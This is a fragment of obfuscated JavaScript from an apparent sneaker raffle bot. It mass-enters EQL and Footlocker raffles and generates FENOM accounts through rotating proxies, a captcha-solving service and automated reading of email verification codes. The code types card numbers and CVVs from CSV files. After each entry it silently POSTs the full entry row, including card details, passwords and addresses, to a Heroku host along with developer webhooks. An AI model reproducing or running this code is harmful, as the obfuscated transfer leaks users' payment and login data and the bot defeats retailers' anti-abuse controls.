                            await _0xaebb71(0x1f4), await _0xaebb71(0x5dc);
                            if (!_0x2a1993['includes']('footlocker'))
                                try {
                                    await _0x36c4e8['click']('#country');
                                    const _0x42cc7d = await _0x36c4e8['$']('li[data-value=\x22' + _0x4da6ed[_0x32ffd8]['Country'] + '\x22]');
                                    await _0x42cc7d['click'](), await _0x42cc7d['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0xaebb71(0x3e8);
                            if (!_0x4da6ed[_0x32ffd8]['Url']['includes']('en-GB')) {
                                await _0x36c4e8['click']('#stateAutocomplete'), await _0xaebb71(0x1f4);
                                try {
                                    const _0x138fee = await _0x36c4e8['$x']('//li[text()=\x22' + _0x4da6ed[_0x32ffd8]['State'] + '\x22]');
                                    await _0x138fee[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Setting\x20Address'), await _0xaebb71(0x3e8), await _0xaebb71(0x1f4), await _0x36c4e8['type']('#address1', _0x4da6ed[_0x32ffd8]['Address1'] + '\x20' + _0x4da6ed[_0x32ffd8]['HouseNumber']), await _0xaebb71(0x1f4), await _0x36c4e8['type']('#address2', '' + _0x4da6ed[_0x32ffd8]['Address2']), await _0xaebb71(0x1f4), await _0x36c4e8['type']('#city', '' + _0x4da6ed[_0x32ffd8]['City']), await _0xaebb71(0x1f4), await _0x36c4e8['type']('#postcode', '' + _0x4da6ed[_0x32ffd8]['Zip']), await _0xaebb71(0x3e8), await _0x36c4e8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xaebb71(0x3e8), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0xcf4032 = await _0x36c4e8['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0xcf4032 && (await _0x36c4e8['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x36c4e8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x36c4e8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xaebb71(0x4b0), await _0x36c4e8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xaebb71(0x1f4), await _0x36c4e8['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CardNumber']), await _0xaebb71(0x320), await _0x36c4e8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x36c4e8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x36c4e8['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['ExpiryDate']), await _0xaebb71(0x4b0), await _0x36c4e8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x36c4e8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x36c4e8['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CVV']), await _0xaebb71(0x226), await _0x36c4e8['type']('input[name=\x22postalCode\x22]', '' + _0x4da6ed[_0x32ffd8]['Zip']), await _0xaebb71(0x226));
                            const _0x2c9f44 = await _0x36c4e8['$']('.__PrivateStripeElement');
                            _0x2c9f44 && (await _0xaebb71(0x1f4), await _0x36c4e8['click']('.__PrivateStripeElement'), await _0x36c4e8['click']('.__PrivateStripeElement'), await _0x36c4e8['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CardNumber']), await _0x36c4e8['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['ExpiryDate']), await _0x36c4e8['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CVV']));
                            await _0xaebb71(0x226), await _0x36c4e8['click']('#paymentConsent'), await _0xaebb71(0x226), await _0x36c4e8['click']('#termsConsent'), await _0xaebb71(0x2bc), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x36c4e8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xaebb71(0x2710);
                            try {
                                await _0x36c4e8['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0xaebb71(0xbb8), await _0x36c4e8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1a39a2 => _0x1a39a2['click']()), await _0x36c4e8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x33421d => _0x33421d['click']());
                            } catch {
                            }
                            try {
                                await _0x36c4e8['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x36312e = await _0x36c4e8['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x36312e) {
                                    _0x4a3ff4['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4da6ed[_0x32ffd8]['Email'] + ',' + _0x4da6ed[_0x32ffd8]['Password'] + ',' + _0x4da6ed[_0x32ffd8]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x2cb3f7() {
                                var _0x34e235, _0x5e73df = ![];
                                for (var _0x930d87 = 0x0; _0x930d87 < 0x18; _0x930d87++) {
                                    async function _0x2c7746() {
                                        var _0x2eb383 = new _0x2b87aa({
                                            'user': _0x579cef['masterMail'],
                                            'password': _0x579cef['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x3d2e6f(_0x1709ef) {
                                            _0x2eb383['openBox']('INBOX', ![], _0x1709ef);
                                        }
                                        _0x2eb383['once']('ready', function () {
                                            console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x3d2e6f(function (_0x584562, _0x3f17ff) {
                                                console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x584562)
                                                    throw _0x584562;
                                                _0x2eb383['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x277f5d, _0x1aed44) {
                                                    if (!_0x1aed44 || !_0x1aed44['length'])
                                                        console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x2eb383['end']();
                                                    else {
                                                        var _0x2e1db2 = _0x2eb383['seq']['fetch'](_0x1aed44, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x2e1db2['on']('message', function (_0x54a393, _0x2c5f1c) {
                                                            var _0x27d9b6 = '(#' + _0x2c5f1c + ')\x20';
                                                            _0x54a393['on']('body', function (_0x2a4226, _0x4941dc) {
                                                                _0x554795(_0x2a4226, (_0x51630e, _0x35614b) => {
                                                                    if (_0x35614b['subject']['includes']('code')) {
                                                                        const _0x2c74bd = _0x35614b['text']['split']('\x0a\x0a')[0x3], _0x461c5b = _0x2c74bd['split']('\x0a')[0x1];
                                                                        _0x34e235 = _0x461c5b;
                                                                    }
                                                                });
                                                            }), _0x54a393['once']('end', function () {
                                                            });
                                                        }), _0x2e1db2['once']('error', function (_0x272209) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x2e1db2['once']('end', function () {
                                                            _0x2eb383['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x2eb383['once']('error', function (_0x542928) {
                                            console['log'](_0x218a39['red'](_0x542928['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5e73df = !![];
                                        }), _0x2eb383['once']('end', async function () {
                                        }), _0x2eb383['connect']();
                                    }
                                    _0x2c7746(), await _0xaebb71(0x1388);
                                    if (_0x34e235)
                                        return _0x34e235;
                                    if (_0x5e73df)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x930d87 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2cb3f7(), await _0xaebb71(0x1f4), await _0x36c4e8['type']('#code', '' + code), await _0xaebb71(0x3e8), await _0x36c4e8['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x65b782 => _0x65b782['click']()), await _0x36c4e8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x36c4e8['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x4da6ed[_0x32ffd8]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x4a3ff4['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x4da6ed[_0x32ffd8]['Email'] + ',' + _0x4da6ed[_0x32ffd8]['Password'] + ',' + _0x4da6ed[_0x32ffd8]['Phone']), _0x1e1eb9 = 'no', _0x20f501(_0x4da6ed[_0x32ffd8], _0x55a4c9);
                            var _0x25fa93 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'dev', ![]), _0x1eb369 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'pub', ![]);
                            let _0x54abe4 = _0x4da6ed[_0x32ffd8];
                            try {
                                prxdata = {
                                    'username': _0x3f93ac['replace']('#', ''),
                                    'module': _0x55a4c9['name'],
                                    'entrydata': JSON['stringify'](_0x54abe4),
                                    'proxy': '' + _0x5c6fc4[_0x32ffd8]
                                };
                                var _0x3a1a26 = JSON['stringify'](prxdata);
                                let _0x282e0f = { 'headers': { 'content-type': 'application/json' } };
                                await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x3a1a26, _0x282e0f);
                            } catch (_0xf87474) {
                            }
                            const _0x3dccde = {
                                'succesDEVMSG': { 'embeds': [_0x25fa93] },
                                'succesPUBMSG': { 'embeds': [_0x1eb369] }
                            };
                            try {
                                _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x3dccde['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x3dccde['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x2aae93, _0x3dccde['succesPUBMSG']);
                            } catch (_0x2faa65) {
                                console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2faa65));
                            }
                        } catch (_0x8e4c17) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20' + _0x8e4c17)), _0x505ce2 = '' + _0x8e4c17;
                            var _0xc3fa7f = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'dev', !![], _0x505ce2), _0x25fa93 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'dev', ![]), _0x1eb369 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'pub', ![]);
                            const _0x4bc61f = {
                                'succesDEVMSG': { 'embeds': [_0x25fa93] },
                                'succesPUBMSG': { 'embeds': [_0x1eb369] }
                            };
                            _0x4bc61f['errorDEV'] = { 'embeds': [_0xc3fa7f] };
                            _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x4bc61f['errorDEV']);
                            await _0x4401f2(_0x2631ac, _0x4bc61f['errorDEV']);
                            if (!_0x1e1eb9 == 'no')
                                _0x1e1eb9 = 'yes';
                        } finally {
                            _0x22ee85 && _0x22ee85['close']();
                            if (_0x1e1eb9 == 'yes' && _0x57033d != 0x5) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x57033d + '\x20/\x205)')), _0x32ffd8 = _0x32ffd8 - 0x1, _0x57033d = _0x57033d + 0x1;
                                continue;
                            }
                            _0x1e1eb9 == 'yes' && _0x57033d >= 0x5 && (_0x47d653(_0x4da6ed[_0x32ffd8], _0x55a4c9), _0x1e1eb9 = 'no', _0x57033d = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    } else {
                        const _0x3ad2bb = '' + _0x4da6ed[_0x32ffd8]['Url'];
                        if (_0x1e1eb9 != 'yes')
                            var _0x1e1eb9 = '', _0x57033d = 0x0;
                        if (_0x4da6ed[_0x32ffd8]['Email'] == '' || _0x4da6ed[_0x32ffd8]['FirstName'] == '' || _0x4da6ed[_0x32ffd8]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x4da6ed[_0x32ffd8]['Password'] == '' && (_0x4da6ed[_0x32ffd8]['Password'] = 'JRaffles23!');
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x2641a2 = _0x5c6fc4[_0x32ffd8]['split'](':');
                        else
                            var _0xe4a13e = Math['round'](Math['random']() * (_0x5c6fc4['length'] - 0x1)), _0x2641a2 = _0x5c6fc4[_0xe4a13e]['split'](':');
                        var _0x22ee85;
                        try {
                            _0x22ee85 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2641a2[0x0] + ':' + _0x2641a2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x22ee85 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2641a2[0x0] + ':' + _0x2641a2[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xd61b73 = await _0x22ee85['newPage']();
                            await _0xd61b73['authenticate']({
                                'username': '' + _0x2641a2[0x2],
                                'password': '' + _0x2641a2[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xd61b73['setRequestInterception'](!![]), _0xd61b73['on']('request', _0x5345de => {
                                _0x5345de['resourceType']() === 'image' || _0x5345de['resourceType']() === 'font' || _0x5345de['resourceType']() === 'media' ? _0x5345de['abort']() : _0x5345de['continue']();
                            }), await _0xd61b73['goto'](_0x3ad2bb), await _0xd61b73['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xd61b73['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xaebb71(0x7d0), await _0xd61b73['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xd61b73['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xaebb71(0x3e8), await _0xd61b73['waitForSelector']('#email'), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xd61b73['type']('#email', '' + _0x4da6ed[_0x32ffd8]['Email']), await _0xaebb71(0x352), await _0xd61b73['waitForSelector']('#password'), await _0xd61b73['type']('#password', '' + _0x4da6ed[_0x32ffd8]['Password']), await _0xaebb71(0x352), await _0xd61b73['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xaebb71(0x1388);
                            if (!_0x4da6ed[_0x32ffd8]['Url']['includes']('footlocker'))
                                await _0xd61b73['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0xd61b73['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x20f501(_0x4da6ed[_0x32ffd8], _0x55a4c9), _0x1e1eb9 = 'no';
                                continue;
                            }
                            await _0xd61b73['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xaebb71(0x3e8);
                            try {
                                _0x4da6ed[_0x32ffd8]['Url']['includes']('en-GB') ? await _0xd61b73['click']('li[data-value=\x22UK\x20' + _0x4da6ed[_0x32ffd8]['Size'] + '\x20/\x20US\x20' + (Number(_0x4da6ed[_0x32ffd8]['Size']) + 0x1) + '\x22]') : await _0xd61b73['click']('li[data-value=\x22EU\x20' + _0x4da6ed[_0x32ffd8]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x4da6ed[_0x32ffd8]['Size']);
                            }
                            await _0xaebb71(0x1f4);
                            const _0x4e790f = await _0xd61b73['$']('#title\x20>\x20label');
                            await _0xaebb71(0x12c);
                            _0x4e790f && await _0x4e790f['click']();
                            await _0xd61b73['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xd61b73['focus']('#postcode'), await _0xd61b73['keyboard']['down']('Control'), await _0xd61b73['keyboard']['press']('A'), await _0xd61b73['keyboard']['up']('Control'), await _0xd61b73['keyboard']['press']('Backspace'), await _0xd61b73['keyboard']['type'](_0x4da6ed[_0x32ffd8]['Zip']), await _0xaebb71(0x60e), await _0xd61b73['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xaebb71(0x3e8), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xaebb71(0x1f4);
                            const _0x4fea53 = await _0xd61b73['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x4fea53 && (await _0xd61b73['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xd61b73['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xd61b73['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xaebb71(0x4b0), await _0xd61b73['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xaebb71(0x1f4), await _0xd61b73['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CardNumber']), await _0xaebb71(0x320), await _0xd61b73['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0xd61b73['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['ExpiryDate']), await _0xaebb71(0x4b0), await _0xd61b73['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0xd61b73['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CVV']), await _0xaebb71(0x226), await _0xd61b73['type']('input[name=\x22postalCode\x22]', '' + _0x4da6ed[_0x32ffd8]['Zip']), await _0xaebb71(0x226));
                            const _0x1f770a = await _0xd61b73['$']('.__PrivateStripeElement');
                            _0x1f770a && (await _0xd61b73['click']('#billingName'), await _0xd61b73['click']('#billingName'), await _0xd61b73['type']('#billingName', '' + _0x4da6ed[_0x32ffd8]['NameOnCard']), await _0xaebb71(0x1f4), await _0xd61b73['click']('.__PrivateStripeElement'), await _0xd61b73['click']('.__PrivateStripeElement'), await _0xd61b73['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CardNumber']), await _0xd61b73['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['ExpiryDate']), await _0xd61b73['keyboard']['type']('' + _0x4da6ed[_0x32ffd8]['CVV']));
                            await _0xaebb71(0x226), await _0xd61b73['click']('#paymentConsent'), await _0xaebb71(0x226), await _0xd61b73['click']('#termsConsent'), await _0xaebb71(0x2bc), console['log'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xd61b73['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xaebb71(0x2710);
                            try {
                                await _0xd61b73['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0xaebb71(0xbb8), await _0xd61b73['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x300622 => _0x300622['click']()), await _0xd61b73['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1ed8a4 => _0x1ed8a4['click']());
                            } catch {
                            }
                            try {
                                await _0xd61b73['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x20f501(_0x4da6ed[_0x32ffd8], _0x55a4c9);
                            var _0x25fa93 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'dev', ![]), _0x1eb369 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'pub', ![]);
                            let _0x20d5e2 = _0x4da6ed[_0x32ffd8];
                            try {
                                prxdata = {
                                    'username': _0x3f93ac['replace']('#', ''),
                                    'module': _0x55a4c9['name'],
                                    'entrydata': JSON['stringify'](_0x20d5e2),
                                    'proxy': '' + _0x5c6fc4[_0x32ffd8]
                                };
                                var _0x3a1a26 = JSON['stringify'](prxdata);
                                let _0x11b1cb = { 'headers': { 'content-type': 'application/json' } };
                                await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x3a1a26, _0x11b1cb);
                            } catch (_0x5a4829) {
                            }
                            const _0x637017 = {
                                'succesDEVMSG': { 'embeds': [_0x25fa93] },
                                'succesPUBMSG': { 'embeds': [_0x1eb369] }
                            };
                            try {
                                _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x637017['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x637017['succesDEVMSG']), await _0xaebb71(0xc8), await _0x4401f2(_0x2aae93, _0x637017['succesPUBMSG']);
                            } catch (_0x23ef83) {
                                console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x23ef83));
                            }
                            _0x1e1eb9 = 'no';
                        } catch (_0x3e01e1) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20' + _0x3e01e1)), _0x505ce2 = '' + _0x3e01e1;
                            var _0xc3fa7f = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'dev', !![], _0x505ce2), _0x25fa93 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'dev', ![]), _0x1eb369 = await _0x3ead77(_0x4da6ed[_0x32ffd8], _0x55a4c9, 'pub', ![]);
                            const _0x3f9765 = {
                                'succesDEVMSG': { 'embeds': [_0x25fa93] },
                                'succesPUBMSG': { 'embeds': [_0x1eb369] }
                            };
                            _0x3f9765['errorDEV'] = { 'embeds': [_0xc3fa7f] }, _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x3f9765['errorDEV']), await _0x4401f2(_0x2631ac, _0x3f9765['errorDEV']), _0x1e1eb9 = 'yes';
                        } finally {
                            _0x22ee85 && _0x22ee85['close']();
                            if (_0x1e1eb9 == 'yes' && _0x57033d != 0x5) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x55a4c9['name'] + ']\x20Task\x20' + (_0x32ffd8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x57033d + '\x20/\x205)')), _0x32ffd8 = _0x32ffd8 - 0x1, _0x57033d = _0x57033d + 0x1;
                                continue;
                            }
                            _0x1e1eb9 == 'yes' && _0x57033d >= 0x5 && (_0x47d653(_0x4da6ed[_0x32ffd8], _0x55a4c9), _0x1e1eb9 = 'no', _0x57033d = 0x0), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x131506, _0x28d668, _0x51a379) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x31336a = 0x0; _0x31336a < _0x28d668['length']; _0x31336a++) {
                        if (_0x4ccc83 != 'yes')
                            var _0x4ccc83 = '', _0x530b3a = 0x0;
                        var _0x43107e;
                        try {
                            await _0x48a0b3(_0x28d668, _0x31336a);
                        } catch {
                            _0x4ccc83 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3e0125(_0x131506['name'] + '\x20Task\x20' + (_0x31336a + 0x1) + '\x20/\x20' + _0x28d668['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        var _0xa8e9d = await _0x3ead77(_0x28d668[_0x31336a], _0x131506, 'acc', ![]);
                        const _0x1ced39 = { 'succesDEVMSG': { 'embeds': [_0xa8e9d] } }, _0xacc707 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0xf3ba52 = Math['round'](Math['random']() * (_0x51a379['length'] - 0x1)), _0x31d072 = _0x51a379[_0xf3ba52]['split'](':'), _0x4bdd84;
                        try {
                            _0x4bdd84 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x31d072[0x0] + ':' + _0x31d072[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4bdd84 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x31d072[0x0] + ':' + _0x31d072[0x1],
